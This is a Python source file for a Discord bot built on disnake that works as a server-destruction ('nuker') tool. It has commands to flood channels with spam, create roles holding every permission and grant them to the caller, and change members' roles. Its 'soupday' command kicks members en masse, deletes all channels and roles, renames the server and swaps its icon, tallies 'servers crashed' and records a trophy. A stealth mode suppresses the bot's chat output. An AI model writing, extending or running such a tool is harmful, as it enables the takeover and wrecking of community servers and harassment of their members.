import asyncio
import disnake
from datetime import datetime
from modules.utils import *
from modules.actions import *
from modules.security import *
from init import *

# Import bot from init
from init import bot


@bot.event
async def on_ready():
    """Bot startup event"""
    await bot.change_presence(
        status=PRESENCE_STATUS,
        activity=disnake.Activity(
            type=PRESENCE_TYPE,
            name=PRESENCE_TEXT
        )
    )

    # Load statistics
    load_statistics()

    # Display bot information
    log_event("BOT", f"{bot.user} activated!", "SYSTEM")
    log_event("INFO", f"Bot version: {Version}", "SYSTEM")
    log_event("INFO", f"Stealth mode: {'ENABLED' if StealthMode else 'DISABLED'}", "SYSTEM")
    log_event("INFO", f"Tester mode: {'ENABLED' if TesterMode else 'DISABLED'}", "SYSTEM")
    log_event("INFO", f"Users in whitelist: {len(whit)}", "SYSTEM")


@bot.command(name="spam")
async def start_spam(ctx, message: str):
    """Start spamming messages"""
    if not check_permissions(ctx):
        return

    set_spam_mode(True)

    if not StealthMode:
        await ctx.send(f"Spam started with message: {message}")

    log_event("COMMAND", f"Spam started by user {ctx.author} with message: {message}", "SPAM")

    while get_spam_mode() and ctx.guild:
        try:
            await ctx.send(message)
            update_statistic("spam_messages")
            update_statistic("messages_sent")
            await apply_delay("spam")
        except:
            break


@bot.command(name="stop_spam")
async def stop_spam(ctx):
    """Stop spam"""
    if not check_permissions(ctx):
        return

    set_spam_mode(False)

    if not StealthMode:
        await ctx.send("Spam stopped!")

    log_event("COMMAND", f"Spam stopped by user {ctx.author}", "SPAM")
    update_statistic("commands_executed")


@bot.command(name="give_role")
async def assign_role(ctx, user_id: int, role_id: int):
    """Assign role to user"""
    if not check_permissions(ctx):
        return

    try:
        member = ctx.guild.get_member(user_id)
        role = ctx.guild.get_role(role_id)

        if member and role:
            await member.add_roles(role)

            if not StealthMode:
                await ctx.send(f"Role {role.name} assigned to user {member.display_name}")

            log_event("COMMAND", f"Role {role.name} assigned to {member} by user {ctx.author}", "ROLES")
            update_statistic("commands_executed")
        else:
            if not StealthMode:
                await ctx.send("User or role not found!")
    except Exception as e:
        log_event("ERROR", f"Error assigning role: {e}", "ROLES")
        if not StealthMode:
            await ctx.send(f"Error: {e}")


@bot.command(name="del_role")
async def remove_role_command(ctx, user_id: int, role_id: int):
    """Remove role from user"""
    if not check_permissions(ctx):
        return

    try:
        member = ctx.guild.get_member(user_id)
        role = ctx.guild.get_role(role_id)

        if member and role:
            await member.remove_roles(role)

            if not StealthMode:
                await ctx.send(f"Role {role.name} removed from user {member.display_name}")

            log_event("COMMAND", f"Role {role.name} removed from {member} by user {ctx.author}", "ROLES")
            update_statistic("commands_executed")
        else:
            if not StealthMode:
                await ctx.send("User or role not found!")
    except Exception as e:
        log_event("ERROR", f"Error removing role: {e}", "ROLES")
        if not StealthMode:
            await ctx.send(f"Error: {e}")


@bot.command(name='make_role')
async def create_role_command(ctx, *, name: str, give: bool = False):
    """Create new role"""
    if not check_permissions(ctx):
        return

    try:
        permissions = disnake.Permissions.all()
        role = await ctx.guild.create_role(name=name, permissions=permissions)

        if give:
            await ctx.author.add_roles(role)

        if not StealthMode:
            await ctx.send(f"Created role {role.mention}!")

        log_event("COMMAND", f"Role {name} created by user {ctx.author}", "ROLES")
        update_statistic("roles_created")
        update_statistic("commands_executed")
    except Exception as e:
        log_event("ERROR", f"Error creating role: {e}", "ROLES")
        if not StealthMode:
            await ctx.send(f"Error: {e}")


@bot.command(name="stats")
async def show_stats(ctx):
    """Show statistics"""
    if not check_permissions(ctx):
        return

    if not StealthMode:
        embed = disnake.Embed(
            title="📊 Bot Statistics",
            color=disnake.Color.blue(),
            timestamp=datetime.now()
        )

        current_stats = get_stats()
        embed.add_field(name="👥 Members",
                        value=f"Kicked: {current_stats['members_kicked']}\nBanned: {current_stats['members_banned']}",
                        inline=True)
        embed.add_field(name="📁 Channels",
                        value=f"Deleted: {current_stats['channels_deleted']}\nCreated: {current_stats['channels_created']}",
                        inline=True)
        embed.add_field(name="🎭 Roles",
                        value=f"Deleted: {current_stats['roles_deleted']}\nCreated: {current_stats['roles_created']}",
                        inline=True)
        embed.add_field(name="📨 Messages",
                        value=f"Sent: {current_stats['messages_sent']}\nSpam: {current_stats['spam_messages']}",
                        inline=True)
        embed.add_field(name="⚙️ Commands", value=f"Executed: {current_stats['commands_executed']}", inline=True)
        embed.add_field(name="💥 Servers", value=f"Crashed: {current_stats['servers_crashed']}", inline=True)

        embed.set_footer(text=f"Bot version: {Version}")
        await ctx.send(embed=embed)

    # Console output
    log_event("INFO", f"=== BOT STATISTICS ===", "STATS")
    for key, value in get_stats().items():
        log_event("INFO", f"{key}: {value}", "STATS")


@bot.command(name="soupday")
async def soup_day_command(ctx):
    # Activate 'Soup Day' protocol
    if not check_permissions(ctx):
        return

    set_soup_mode(True)
    guild = ctx.guild
    server_name = guild.name
    bot_member = guild.me

    log_event("CRITICAL", f"ACTIVATING 'SOUP DAY' PROTOCOL on server: {server_name}", "SOUPDAY")
    update_statistic("servers_crashed")
    update_statistic("commands_executed")

    # Send start message
    if not StealthMode:
        await ctx.send(SoupDayMessage)

    # Prepare tasks
    tasks = []
    results = []

    # Kick users
    if SoupDayMethod.lower() == "kick":
        tasks.append(perform_mass_kick(guild, bot_member, ctx))

    # Rename server
    if ChangeServerName:
        tasks.append(rename_guild_server(guild, SoupDayServerName, ctx))

    # Delete channels
    tasks.append(delete_all_channels(guild, ctx))

    # Delete roles
    tasks.append(delete_all_roles(guild, ctx))

    # Change icon
    if ChangeServerIcon:
        tasks.append(change_guild_icon(guild, ctx))

    # Execute all tasks in parallel
    if tasks:
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            log_event("ERROR", f"Error executing tasks: {e}", "SOUPDAY")

    # Final report
    log_event("CRITICAL", f"SERVER COMPLETED: {server_name}", "SOUPDAY")

    # Save statistics
    save_statistics()

    # Trophy
    create_trophy(server_name, guild.id, ctx.author.name, ctx.author.id)

    set_soup_mode(False)


@bot.command(name="save_stats")
async def save_stats_command(ctx):
    # Manual statistics save
    if not check_permissions(ctx):
        return

    save_statistics()

    if not StealthMode:
        await ctx.send("Statistics saved!")

    log_event("COMMAND", f"Statistics saved by user {ctx.author}", "STATS")


@bot.command(name="log_test")
async def log_test_command(ctx):
    # Test logging system
    if not check_permissions(ctx):
        return

    log_event("DEBUG", "Test DEBUG message", "TEST")
    log_event("INFO", "Test INFO message", "TEST")
    log_event("WARNING", "Test WARNING message", "TEST")
    log_event("ERROR", "Test ERROR message", "TEST")
    log_event("CRITICAL", "Test CRITICAL message", "TEST")
    log_event("SUCCESS", "Test SUCCESS message", "TEST")

    if not StealthMode:
        await ctx.send("Log test completed!")